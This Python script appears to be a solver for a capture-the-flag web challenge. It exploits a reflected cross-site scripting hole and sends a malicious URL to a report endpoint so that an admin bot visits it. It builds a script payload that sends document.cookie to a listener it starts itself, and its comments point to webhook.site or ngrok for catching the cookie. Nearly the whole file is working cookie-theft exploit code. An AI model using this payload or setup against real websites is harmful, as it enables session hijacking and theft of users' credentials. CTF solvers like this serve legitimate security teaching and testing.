import sys
import time
import urllib.parse
import urllib.request
from http.server import HTTPServer, BaseHTTPRequestHandler
import threading

FLAG = ""

# A simple HTTP server to catch the stolen cookie
class CatchHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        global FLAG
        if '/?c=' in self.path:
            FLAG = urllib.parse.unquote(self.path.split('/?c=')[1])
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"Caught")
        else:
            self.send_response(200)
            self.end_headers()

def start_server():
    server = HTTPServer(('0.0.0.0', 8000), CatchHandler)
    server.handle_request() # Handle exactly one request

def main():
    target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8080"
    
    # NOTE: The solver needs a public IP/Webhook to catch the flag. 
    # For local testing, we assume the host is accessible from the container.
    # In a real CTF, the player uses Webhook.site or ngrok.
    # Here, we use a trick: If running in Docker desktop, host.docker.internal works.
    # We will just print the payload for manual testing or use a mock webhook.
    
    webhook_url = "http://host.docker.internal:8000" 
    
    # Start our listener
    threading.Thread(target=start_server, daemon=True).start()
    
    payload = f"<script>location='{webhook_url}/?c=' + document.cookie</script>"
    encoded_payload = urllib.parse.quote(payload)
    
    malicious_url = f"http://127.0.0.1/?name={encoded_payload}"
    
    print(f"[*] Submitting malicious URL: {malicious_url}")
    
    data = urllib.parse.urlencode({'url': malicious_url}).encode('utf-8')
    req = urllib.request.Request(f"{target}/report", data=data, method='POST')
    
    try:
        urllib.request.urlopen(req)
        print("[*] Waiting for bot to visit...")
        time.sleep(5)
        if FLAG:
            print(f"[+] Exploit successful! Flag: {FLAG}")
            sys.exit(0)
        else:
            print("[-] Bot did not trigger the webhook.")
            sys.exit(1)
    except Exception as e:
        print(f"[-] Failed: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
